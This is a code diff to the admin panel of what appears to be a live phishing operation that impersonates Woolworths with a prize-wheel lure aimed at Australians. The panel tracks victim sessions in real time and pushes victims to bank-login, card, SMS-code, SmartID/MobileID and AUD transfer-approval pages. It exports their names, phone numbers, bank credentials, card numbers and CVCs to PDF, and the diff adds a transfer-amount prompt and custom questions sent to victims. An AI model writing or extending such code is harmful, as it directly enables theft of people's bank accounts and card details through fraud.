@@ -4,7 +4,8 @@ import { useCallback, useEffect, useState, useRef, Fragment, useMemo } from "rea
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { DemoSession } from "@/types/session";
 import { pathToStep } from "@/lib/session-routes";
-import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
+import { playBeautifulNotification, showBeautifulToast, sendBrowserNotification } from "@/lib/notification";
+import { LiveWatchModal } from "./LiveWatchModal";
 import {
   isSessionLive,
   parseVisitorPresenceState,
@@ -19,7 +20,9 @@ import {
 import { getAuBankPageEntry } from "@/lib/au-bank-page-map";
 
 const SESSION_LIST_COLUMNS =
-  "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden,last_ping_at";
+  "id,public_id,created_at,updated_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden,last_ping_at";
+
+const LOG_PAGE_SIZE = 100;
 
 const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "smartid_1", label: "SmartID 1 Sayfası" },
@@ -28,6 +31,7 @@ const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "mobileid_2", label: "MobileID 2 Sayfası" },
   { value: "biometrika_pin_1", label: "Biometrika/PIN 1" },
   { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
+  { value: "transfer", label: "Transfer Onayı (AUD$)" },
 ];
 
 const UA_BANNED_RE = /(mozilla|applewebkit|webkit|gecko|chrome|safari|windows nt|win64|win32|android|iphone|ipad|mac os|linux x86_64|x86_64|like gecko|khtml|version\/|mobile|firefox|opera|edge|msie|trident|opr\/|edg\/|brave|vivaldi|netscape)/i;
@@ -139,14 +143,26 @@ function sanitizeFormDataAll(rawFd: any): any {
 }
 
 function getApprovalDisplayText(value: string): string {
-  const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === value);
+  if (!value) return "";
+  const isConfirmed = value.endsWith("_confirmed");
+  const rawValue = isConfirmed ? value.slice(0, -"_confirmed".length) : value;
+
+  // Transfer onayi: kolonda tek "Transfer" goster.
+  if (rawValue.startsWith("transfer")) {
+    return isConfirmed ? "Transfer Onaylandı" : "Transfer [Bekliyor]";
+  }
+
+  const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === rawValue);
   if (!matchedOption) {
+    if (isConfirmed && value.trim()) return `${value.replace("_confirmed", "")} Onaylandı`;
     return "";
   }
 
-  return matchedOption.label.includes("Sayfası")
-    ? matchedOption.label.replace(" Sayfası", " Onaylandı")
-    : `${matchedOption.label} Onaylandı`;
+  const labelBase = matchedOption.label.includes(" Sayfası")
+    ? matchedOption.label.replace(" Sayfası", "")
+    : matchedOption.label;
+
+  return isConfirmed ? `${labelBase} Onaylandı` : `${labelBase} [Bekliyor]`;
 }
 
 function getApprovalStepLabel(value: string): string {
@@ -156,6 +172,38 @@ function getApprovalStepLabel(value: string): string {
   }
 
   return matchedOption.label.replace(" Sayfası", "").toUpperCase();
+}
+
+// Banka sayfalarindaki gibi: degeri karakter karakter kutucuklarda gosterir.
+// Orn: "a1b2" -> [a][1][b][2] (kopyalamak icin kutuya tikla)
+function renderCharBoxes(
+  value: string,
+  darkMode: boolean,
+  onCopy?: (v: string) => void,
+) {
+  const chars = String(value ?? "").split("");
+  if (chars.length === 0) return null;
+  return (
+    <span
+      className="inline-flex max-w-full flex-wrap items-center gap-[3px]"
+      title={onCopy ? "Kopyalamak için tıkla" : undefined}
+      onClick={onCopy ? () => onCopy(String(value)) : undefined}
+      style={onCopy ? { cursor: "pointer" } : undefined}
+    >
+      {chars.map((ch, i) => (
+        <span
+          key={i}
+          className={`inline-flex h-[22px] min-w-[20px] items-center justify-center rounded-[5px] border px-1 font-mono text-[11px] font-bold leading-none ${
+            darkMode
+              ? "border-white/15 bg-white/[0.06] text-zinc-100"
+              : "border-gray-300 bg-white text-gray-900 shadow-sm"
+          }`}
+        >
+          {ch === " " ? "\u00A0" : ch}
+        </span>
+      ))}
+    </span>
+  );
 }
 
 function parseApprovalHistory(value: unknown): string[] {
@@ -445,13 +493,40 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
   return entries.map((e): [string, string] => [e.key, e.value]).slice(0, 3);
 }
 
-export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
+export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: boolean, user: any, displayMode?: "normal" | "deleted" | "trash" }) {
+  const isDeletedMode = displayMode === "deleted";
+  const isTrashMode = displayMode === "trash";
   const supabase = createBrowserSupabaseClient();
   const [rows, setRows] = useState<DemoSession[]>([]);
   const rowsRef = useRef<DemoSession[]>([]);
+  const userRef = useRef<any>(user);
   useEffect(() => {
     rowsRef.current = rows;
   }, [rows]);
+  useEffect(() => {
+    userRef.current = user;
+  }, [user]);
+  const getCurrentUsername = () => {
+    const u = userRef.current;
+    return (u?.user_metadata?.username || u?.email?.split('@')[0] || "").toString().trim();
+  };
+  const isSessionVisibleForCurrentUser = (row?: DemoSession | null) => {
+    if (!row) return false;
+    const hidden = row.is_hidden === true;
+    const pending = (row.form_data as any)?.pending_profile === true;
+    // COP LOGLAR: sadece anadomainden gelip isim girmeden kalan bos session'lar
+    if (isTrashMode) return !hidden && pending;
+    if (isDeletedMode ? !hidden : hidden) return false;
+    // Ana domainden gelip henuz isim/odul girmemis bos session'lar gizli kalir
+    if (!isDeletedMode && pending) return false;
+    // Sadece kendi partner'ina ait session'lari gor (super_admin haric)
+    const username = getCurrentUsername();
+    if (username !== "super_admin") {
+      const p = (row as any).partner_name || "";
+      if (p !== username) return false;
+    }
+    return true;
+  };
 
   // AYNI satir (id) icin ardışık gelen UPDATE eventlerini 500ms SON DEĞERE (trailing debounce) sikistir.
   // Ornek: wait -> wheel -> wait -> wheel 4 event 400ms icinde geliyorsa, sonuncuyu (wheel) AL, 500ms sonra SET.
@@ -461,23 +536,31 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   const FLUSH_DEBOUNCE_MS = 500;
 
   const applyRowUpdate = useCallback((nextRow: DemoSession) => {
+    const visible = isSessionVisibleForCurrentUser(nextRow);
     setRows((prev) => {
       const idx = prev.findIndex((r) => r.id === nextRow.id);
       if (idx === -1) {
-        if (nextRow.is_hidden) return prev;
-        return [nextRow, ...prev].slice(0, 50);
+        if (!visible || pageRef.current !== 0) return prev;
+        return [nextRow, ...prev].slice(0, LOG_PAGE_SIZE);
       }
-      if (nextRow.is_hidden) {
+      if (!visible) {
         return prev.filter((r) => r.id !== nextRow.id);
       }
       const next = [...prev];
       next[idx] = nextRow;
       return next;
     });
-    // Sayac (logCount) icin gerekli guncelleme: hidden durumu degisirse
+    // Sayac (logCount) icin gerekli guncelleme: gorunurluk degisirse
     setLogCount((c) => {
-      const hadBefore = rowsRef.current.some((r) => r.id === nextRow.id && !r.is_hidden);
-      const hasAfter = !nextRow.is_hidden;
+      const hadBefore = rowsRef.current.some((r) => r.id === nextRow.id);
+      const hasAfter = visible;
+      if (hadBefore && !hasAfter) return Math.max(0, c - 1);
+      if (!hadBefore && hasAfter) return c + 1;
+      return c;
+    });
+    setTotalCount((c) => {
+      const hadBefore = rowsRef.current.some((r) => r.id === nextRow.id);
+      const hasAfter = visible;
       if (hadBefore && !hasAfter) return Math.max(0, c - 1);
       if (!hadBefore && hasAfter) return c + 1;
       return c;
@@ -506,6 +589,14 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
   // Stats
   const [logCount, setLogCount] = useState(0);
+  const [totalCount, setTotalCount] = useState(0);
+  const [page, setPage] = useState(0);
+  const pageRef = useRef(0);
+  useEffect(() => {
+    pageRef.current = page;
+  }, [page]);
+  const [liveWatchRow, setLiveWatchRow] = useState<DemoSession | null>(null);
+  const [exporting, setExporting] = useState(false);
   const [bannedCount, setBannedCount] = useState(0);
   const [bannedIPs, setBannedIPs] = useState<Array<{ ip_address: string; reason: string | null; banned_at: string | null }>>([]);
   const [banListModalOpen, setBanListModalOpen] = useState(false);
@@ -570,6 +661,9 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   const [smsModeUnknown, setSmsModeUnknown] = useState(false);
   const [approvalPromptSessionId, setApprovalPromptSessionId] = useState<string | null>(null);
   const [approvalPromptType, setApprovalPromptType] = useState("");
+  const [approvalAmountInput, setApprovalAmountInput] = useState("");
+  const [questionPromptSessionId, setQuestionPromptSessionId] = useState<string | null>(null);
+  const [questionInput, setQuestionInput] = useState("");
   const [approvalCodeInput, setApprovalCodeInput] = useState("");
 
   const [soundEnabled, setSoundEnabled] = useState(false);
@@ -601,33 +695,76 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
     }
   }, []);
 
-  const load = useCallback(async () => {
+  const load = useCallback(async (pageArg?: number) => {
     if (!supabase) return;
-    let query = supabase
-      .from("sessions")
-      .select(SESSION_LIST_COLUMNS)
-      .neq("is_hidden", true)
-      .order("created_at", { ascending: false });
 
-    // Sadece super_admin olmayanlar için filtrele
-    const username = user?.user_metadata?.username || user?.email?.split('@')[0];
-    if (username !== "super_admin") {
-      query = query.eq("partner_name", username);
-    }
+    const fetchPage = async (p: number): Promise<void> => {
+      let query = supabase
+        .from("sessions")
+        .select(SESSION_LIST_COLUMNS, { count: "exact" });
 
-    const { data } = await query.limit(50);
-    const fetchedRows = (data as DemoSession[]) ?? [];
-    setRows((prev) => {
-      if (!prev && !fetchedRows) return prev;
-      if (prev?.length === fetchedRows.length) {
-        try {
-          if (JSON.stringify(prev) === JSON.stringify(fetchedRows)) return prev;
-        } catch { /* noop */ }
+      // displayMode'a gore filtrele
+      if (isDeletedMode) {
+        query = query.eq("is_hidden", true);
+      } else if (isTrashMode) {
+        query = query
+          .or("is_hidden.is.false,is_hidden.is.null")
+          .eq("form_data->>pending_profile", "true");
+      } else {
+        query = query
+          .or("is_hidden.is.false,is_hidden.is.null")
+          .or("form_data->>pending_profile.is.null,form_data->>pending_profile.neq.true");
       }
-      setLogCount(fetchedRows.length);
-      return fetchedRows;
-    });
-  }, [supabase, user]);
+      query = query.order("created_at", { ascending: false });
+
+      // Sadece super_admin olmayanlar için filtrele
+      const username = user?.user_metadata?.username || user?.email?.split('@')[0];
+      if (username !== "super_admin") {
+        query = query.eq("partner_name", username);
+      }
+
+      const { data, count } = await query.range(p * LOG_PAGE_SIZE, (p + 1) * LOG_PAGE_SIZE - 1);
+      const fetchedRows = ((data ?? []) as any) as DemoSession[];
+      const total = typeof count === "number" ? count : fetchedRows.length;
+
+      // Silme/geri yukleme sonrasi sayfa bos kalirsa son dolu sayfaya dus
+      if (fetchedRows.length === 0 && p > 0) {
+        const lastPage = Math.max(0, Math.ceil(total / LOG_PAGE_SIZE) - 1);
+        if (lastPage !== p) {
+          setPage(lastPage);
+          pageRef.current = lastPage;
+          return fetchPage(lastPage);
+        }
+      }
+
+      setRows(fetchedRows);
+      setTotalCount(total);
+      setLogCount(total);
+    };
+
+    await fetchPage(pageArg ?? pageRef.current);
+  }, [supabase, user, isDeletedMode, isTrashMode]);
+
+  const totalPages = Math.max(1, Math.ceil(totalCount / LOG_PAGE_SIZE));
+  const goToPage = (p: number) => {
+    const next = Math.min(Math.max(p, 0), totalPages - 1);
+    if (next === pageRef.current) return;
+    setPage(next);
+    pageRef.current = next;
+    void load(next);
+  };
+  const pageWindow: Array<number | "…"> = (() => {
+    const wanted = new Set<number>([0, totalPages - 1, page - 2, page - 1, page, page + 1, page + 2]);
+    const sorted = [...wanted].filter((n) => n >= 0 && n < totalPages).sort((a, b) => a - b);
+    const out: Array<number | "…"> = [];
+    let prevNum = -1;
+    for (const n of sorted) {
+      if (prevNum >= 0 && n - prevNum > 1) out.push("…");
+      out.push(n);
+      prevNum = n;
+    }
+    return out;
+  })();
 
   const loadBanData = useCallback(async () => {
     if (!supabase) return;
@@ -722,20 +859,27 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
         ch.on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, (payload: any) => {
           if (payload.eventType === "INSERT") {
             const newRow = payload.new as DemoSession;
-            if (newRow.is_hidden) return;
+            if (!isSessionVisibleForCurrentUser(newRow)) return;
             setRows((prev) => {
+              if (pageRef.current !== 0) return prev;
               if (prev.some((r) => r.id === newRow.id)) return prev;
-              return [newRow, ...prev].slice(0, 50);
+              return [newRow, ...prev].slice(0, LOG_PAGE_SIZE);
             });
             setLogCount((c) => c + 1);
+            setTotalCount((c) => c + 1);
+            const fd = (newRow.form_data ?? {}) as Record<string, string | undefined>;
+            const name = `${fd.firstName || ""} ${fd.lastName || ""}`.trim() || "Yeni ziyaretçi";
+            sendBrowserNotification("Yeni Log", name);
             return;
           }
 
           if (payload.eventType === "DELETE") {
             const oldRow = payload.old as DemoSession;
             if (oldRow?.id) {
+              if (!rowsRef.current.some((r) => r.id === oldRow.id)) return;
               setRows((prev) => prev.filter((r) => r.id !== oldRow.id));
               setLogCount((c) => Math.max(0, c - 1));
+              setTotalCount((c) => Math.max(0, c - 1));
               if (deviceInfoSession?.id === oldRow.id) setDeviceInfoSession(null);
               if (chatSessionId === oldRow.id) setChatSessionId(null);
               if (smsPromptSessionId === oldRow.id) setSmsPromptSessionId(null);
@@ -752,12 +896,18 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
             const newRow = payload.new as DemoSession;
             const oldRow = rowsRef.current.find((r) => r.id === newRow.id) ?? (payload.old as DemoSession | null);
 
-            if (newRow.is_hidden) {
+            const visibleNow = isSessionVisibleForCurrentUser(newRow);
+            const visibleBefore = rowsRef.current.some((r) => r.id === newRow.id);
+
+            if (!visibleNow) {
               const to = pendingUpdateTimeoutsRef.current.get(newRow.id);
               if (to) { window.clearTimeout(to); pendingUpdateTimeoutsRef.current.delete(newRow.id); }
               pendingUpdatesRef.current.delete(newRow.id);
-              setRows((prev) => prev.filter((r) => r.id !== newRow.id));
-              setLogCount((c) => Math.max(0, c - 1));
+              if (visibleBefore) {
+                setRows((prev) => prev.filter((r) => r.id !== newRow.id));
+                setLogCount((c) => Math.max(0, c - 1));
+                setTotalCount((c) => Math.max(0, c - 1));
+              }
               if (deviceInfoSession?.id === newRow.id) setDeviceInfoSession(null);
               if (chatSessionId === newRow.id) setChatSessionId(null);
               if (smsPromptSessionId === newRow.id) setSmsPromptSessionId(null);
@@ -946,6 +1096,11 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
       return;
     }
 
+    if (action === "custom_question") {
+      setQuestionPromptSessionId(sessionId);
+      return;
+    }
+
     if (action === "win" || action === "wheel" || action === "code_entry" || action === "banken" || action === "bank" || action === "bank_login" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
       await supabase.from("sessions").update({ current_step: action }).eq("id", sessionId);
     } else if (action === "ban_ip") {
@@ -1038,6 +1193,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
           ...previousFormData,
           approvalStatus: approvalPromptType,
           approvalCode: approvalCodeInput.trim(),
+          transferAmount: approvalPromptType === "transfer" ? approvalAmountInput.trim() : "",
           specialNoticeText: "",
           specialNoticeImage: "",
           specialNoticeLang: undefined,
@@ -1048,6 +1204,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
     setApprovalPromptSessionId(null);
     setApprovalPromptType("");
+    setApprovalAmountInput("");
     setApprovalCodeInput("");
     void load();
   }
@@ -1068,6 +1225,211 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
     await supabase.from("sessions").update({ is_hidden: true }).in("id", ids);
     void load();
+  };
+
+  const handleRestoreLog = async (sessionId: string) => {
+    if (!supabase) return;
+    await supabase.from("sessions").update({ is_hidden: false }).eq("id", sessionId);
+    void load();
+  };
+
+  const handlePermanentDelete = async (sessionId: string) => {
+    if (!supabase) return;
+    const ok = confirm("Bu logu KALICI olarak silmek istediğinize emin misiniz? Bu işlem GERİ ALINAMAZ!");
+    if (!ok) return;
+    await supabase.from("sessions").delete().eq("id", sessionId);
+    void load();
+  };
+
+  const handleExport = async () => {
+    if (!supabase || exporting) return;
+    setExporting(true);
+    try {
+      const all: DemoSession[] = [];
+      const BATCH = 1000;
+      for (let from = 0; ; from += BATCH) {
+        let query = supabase
+          .from("sessions")
+          .select(SESSION_LIST_COLUMNS)
+          .order("created_at", { ascending: false });
+        if (isDeletedMode) {
+          query = query.eq("is_hidden", true);
+        } else if (isTrashMode) {
+          query = query
+            .or("is_hidden.is.false,is_hidden.is.null")
+            .eq("form_data->>pending_profile", "true");
+        } else {
+          query = query
+            .or("is_hidden.is.false,is_hidden.is.null")
+            .or("form_data->>pending_profile.is.null,form_data->>pending_profile.neq.true");
+        }
+        const { data, error: qErr } = await query.range(from, from + BATCH - 1);
+        if (qErr) throw qErr;
+        const batch = (data ?? []) as DemoSession[];
+        all.push(...batch);
+        if (batch.length < BATCH) break;
+      }
+
+      // Admin tablosuyla ayni kolon yapisi: cizgili tablo PDF
+      const s = (v: unknown) => (v == null ? "" : String(v));
+      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "SMS", "Kart", "Sayfa", "IP", "Cihaz"];
+
+      const tableBody: any[][] = [
+        COL_HEADERS.map(
+          (h) => ({ text: h, bold: true, color: "#ffffff", fillColor: "#111827", fontSize: 7.5 })
+        ),
+      ];
+
+      for (const r of all) {
+        const fd = (r.form_data ?? {}) as Record<string, any>;
+
+        const bankCell: any[] = [];
+        if (fd.bankName) bankCell.push({ text: s(fd.bankName), bold: true, color: "#a16207" });
+        for (const [k, v] of getCanonicalAdminBankFields(fd)) bankCell.push({ text: `${k}: ${v}` });
+        if (!bankCell.length) bankCell.push({ text: "-", color: "#9ca3af" });
+
+        const approvalHist = parseApprovalHistory(fd.approvalHistory);
+        const curAppr = typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
+        const approvalEntries = curAppr ? [curAppr, ...approvalHist] : approvalHist;
+        const approvalCell = approvalEntries.length
+          ? approvalEntries.map((a) => ({
+              text: getApprovalDisplayText(a),
+              color: a.endsWith("_confirmed") ? "#059669" : "#d97706",
+            }))
+          : { text: "-", color: "#9ca3af" };
+
+        const smsValue = s(fd.smsCode).trim() || s(fd.tacCode).trim() || "-";
+
+        const cardCell: any[] = [];
+        if (fd.cardNumber) cardCell.push({ text: `No: ${s(fd.cardNumber)}` });
+        if (fd.cardExpiry) cardCell.push({ text: `Exp: ${s(fd.cardExpiry)}` });
+        if (fd.cardCvc) cardCell.push({ text: `CVC: ${s(fd.cardCvc)}` });
+        if (!cardCell.length) cardCell.push({ text: "-", color: "#9ca3af" });
+
+        tableBody.push([
+          s(r.public_id ?? r.id.split("-")[0]),
+          r.created_at ? new Date(r.created_at).toLocaleString("tr-TR") : "-",
+          { text: r.amount ? `A$${r.amount}` : s(fd.wheel_result_label) || "-", bold: true, color: "#c2410c" },
+          s(`${fd.firstName ?? ""} ${fd.lastName ?? ""}`.trim()) || "-",
+          s(fd.phone) || "-",
+          { stack: bankCell },
+          Array.isArray(approvalCell) ? { stack: approvalCell } : approvalCell,
+          { text: smsValue, bold: smsValue !== "-" },
+          { stack: cardCell },
+          s(r.current_step) || "-",
+          s(r.ip_address) || "-",
+          (() => {
+            const ua = s(r.user_agent);
+            if (!ua) return { text: "-", color: "#9ca3af" };
+            const info = parseUserAgent(ua);
+            const modelTxt = info.model && !/masaüstü|tespit edilemedi/i.test(info.model) ? ` • ${info.model}` : "";
+            return {
+              stack: [
+                { text: `${info.device} • ${info.os} • ${info.browser}${modelTxt}`, bold: true, fontSize: 6.5 },
+                { text: ua, fontSize: 5, color: "#6b7280" },
+              ],
+            };
+          })(),
+        ]);
+      }
+
+      const pdfMakeModule = await import("pdfmake/build/pdfmake");
+      const pdfFontsModule = await import("pdfmake/build/vfs_fonts");
+      const pdfMake: any = (pdfMakeModule as any).default ?? pdfMakeModule;
+      pdfMake.vfs =
+        (pdfFontsModule as any).pdfMake?.vfs ??
+        (pdfFontsModule as any).default?.pdfMake?.vfs ??
+        (pdfFontsModule as any).vfs;
+
+      const dateStr = new Date().toISOString().slice(0, 10);
+
+      // Kolon genisligi = icerigin en uzun satirina gore orantisal dagitim
+      const cellMaxLen = (cell: any): number => {
+        if (cell == null) return 0;
+        const items: any[] = Array.isArray(cell) ? cell : cell.stack ? cell.stack : [cell];
+        let m = 0;
+        for (const it of items) {
+          const t = typeof it === "object" && it !== null ? s(it.text) : s(it);
+          if (t.length > m) m = t.length;
+        }
+        return m;
+      };
+      const colMax = COL_HEADERS.map((h) => h.length);
+      for (const row of tableBody.slice(1)) {
+        row.forEach((cell: any, i: number) => {
+          const l = cellMaxLen(cell);
+          if (l > colMax[i]) colMax[i] = l;
+        });
+      }
+      const usable = 802; // A4 landscape - margins
+      const cap = 170;
+      const want = colMax.map((l) => l * 3.6 + 8);
+      const desired = want.map((w) => Math.min(Math.max(w, 28), cap));
+      const used = desired.reduce((a, b) => a + b, 0);
+      let widths: number[];
+      if (used < usable) {
+        const overflow = want.map((w) => Math.max(w - cap, 0));
+        const totalOv = overflow.reduce((a, b) => a + b, 0);
+        const leftover = usable - used;
+        widths = desired.map((w, i) =>
+          totalOv > 0 ? w + (leftover * overflow[i]) / totalOv : w
+        );
+      } else {
+        const sc = usable / used;
+        widths = desired.map((w) => Math.max(w * sc, 20));
+      }
+
+      const doc: any = {
+        pageSize: "A4",
+        pageOrientation: "landscape",
+        pageMargins: [20, 46, 20, 30],
+        header: {
+          margin: [20, 12, 20, 0],
+          columns: [
+            { text: `Woolworths — ${isTrashMode ? "Çöp " : isDeletedMode ? "Silinen " : ""}Log Yedeği`, style: "title" },
+            { text: `${all.length} kayıt • ${dateStr}`, style: "subtitle", alignment: "right" },
+          ],
+        },
+        footer: (currentPage: number, pageCount: number) => ({
+          text: `Sayfa ${currentPage} / ${pageCount}`,
+          alignment: "center",
+          fontSize: 7,
+          color: "#9ca3af",
+          margin: [0, 8, 0, 0],
+        }),
+        content: [
+          {
+            table: {
+              headerRows: 1,
+              widths,
+              body: tableBody,
+            },
+            layout: {
+              hLineWidth: () => 0.5,
+              vLineWidth: () => 0.5,
+              hLineColor: () => "#cbd5e1",
+              vLineColor: () => "#cbd5e1",
+              paddingLeft: () => 3,
+              paddingRight: () => 3,
+              paddingTop: () => 3,
+              paddingBottom: () => 3,
+            },
+            fontSize: 7,
+          },
+        ],
+        styles: {
+          title: { fontSize: 13, bold: true, color: "#111827" },
+          subtitle: { fontSize: 8, color: "#6b7280" },
+        },
+        defaultStyle: { fontSize: 7 },
+      };
+
+      pdfMake.createPdf(doc).download(`woolworths-loglar-${isTrashMode ? "cop-" : isDeletedMode ? "silinen-" : ""}${dateStr}.pdf`);
+    } catch (e) {
+      alert(`Export hatasi: ${e instanceof Error ? e.message : "bilinmeyen hata"}`);
+    } finally {
+      setExporting(false);
+    }
   };
 
   useEffect(() => {
@@ -1314,6 +1676,37 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
     void load();
   }
 
+  async function publishCustomQuestion() {
+    if (!supabase || !questionPromptSessionId || !questionInput.trim()) return;
+    const { data: existing } = await supabase
+      .from("sessions")
+      .select("*")
+      .eq("id", questionPromptSessionId)
+      .maybeSingle();
+    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
+    const prevList = Array.isArray(prev.customQuestions)
+      ? (prev.customQuestions as Array<Record<string, unknown>>)
+      : [];
+    await supabase
+      .from("sessions")
+      .update({
+        is_hidden: false,
+        status: "online",
+        current_step: "custom_question",
+        form_data: {
+          ...prev,
+          customQuestions: [
+            ...prevList,
+            { question: questionInput.trim(), askedAt: new Date().toISOString() },
+          ],
+        },
+      })
+      .eq("id", questionPromptSessionId);
+    setQuestionPromptSessionId(null);
+    setQuestionInput("");
+    void load();
+  }
+
   function extractDeviceModel(ua: string): string | null {
     const androidParen = ua.match(/\(Linux;\s*Android\s+[\d.]+;\s*([^)]+)\)/i);
     if (androidParen) {
@@ -1374,7 +1767,9 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
             <div className={`p-2 rounded-xl ${darkMode ? 'bg-white/10 text-white' : 'bg-black/5 text-black'}`}>
               <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
             </div>
-            <h2 className={`text-2xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>Loglar ve Canlı Takip</h2>
+            <h2 className={`text-2xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>
+              {isTrashMode ? "Çöp Loglar" : isDeletedMode ? "Geçmiş & Silinen Loglar" : "Loglar ve Canlı Takip"}
+            </h2>
           </div>
           <div className="flex items-center gap-3">
             <button
@@ -1385,6 +1780,54 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
             >
               <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
               Tümünü Sil
+            </button>
+            {isDeletedMode && (
+              <>
+                <button
+                  onClick={async () => {
+                    if (!confirm("TÜM geçmiş logları (silinenleri) GERİ YÜKLEMEK istediğinize emin misiniz?")) return;
+                    if (!supabase) return;
+                    const ids = rowsRef.current.map(r => r.id);
+                    if (ids.length === 0) return;
+                    await supabase.from("sessions").update({ is_hidden: false }).in("id", ids);
+                    void load();
+                  }}
+                  className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
+                    darkMode ? "bg-green-500/10 border border-green-500/20 text-green-500 hover:bg-green-500 hover:text-white" : "bg-green-50 border border-green-200 text-green-600 hover:bg-green-500 hover:text-white"
+                  }`}
+                >
+                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h10a8 8 0 018 8v2M3 10l6 6m-6-6l6-6" /></svg>
+                  Tümünü Geri Yükle
+                </button>
+                <button
+                  onClick={async () => {
+                    if (!confirm("TÜM geçmiş logları KALICI olarak silmek istediğinize emin misiniz? GERİ ALINMAZ!")) return;
+                    if (!supabase) return;
+                    const ids = rowsRef.current.map(r => r.id);
+                    if (ids.length === 0) return;
+                    await supabase.from("sessions").delete().in("id", ids);
+                    void load();
+                  }}
+                  className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
+                    darkMode ? "bg-red-500/10 border border-red-500/20 text-red-500 hover:bg-red-500 hover:text-white" : "bg-red-50 border border-red-200 text-red-600 hover:bg-red-500 hover:text-white"
+                  }`}
+                >
+                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
+                  Tümünü Kalıcı Sil
+                </button>
+              </>
+            )}
+            <button
+              onClick={() => void handleExport()}
+              disabled={exporting}
+              className={`flex items-center gap-2 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md disabled:opacity-50 ${
+                darkMode
+                  ? "bg-[#1c1c1e] border border-white/10 text-zinc-300 hover:bg-white/10 hover:text-white"
+                  : "bg-white border border-gray-200 text-gray-600 hover:bg-gray-50 hover:text-black"
+              }`}
+            >
+              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" /></svg>
+              {exporting ? "İndiriliyor..." : "PDF İndir"}
             </button>
             <button
               onClick={() => {
@@ -1441,9 +1884,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
                 <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
                 <th className="w-[32%] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
-                {/* ONAY KOLONU GIZLI (L1406 colSpan 10, L2000, L2252, L2390 colSpan duzeltildi)
-                <th className="w-[14%] px-2 py-3 font-semibold whitespace-nowrap">Onay</th> */}
-                <th className="hidden w-[14%] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
+                <th className="w-[14%] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
                 <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
                 <th className="w-[11%] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
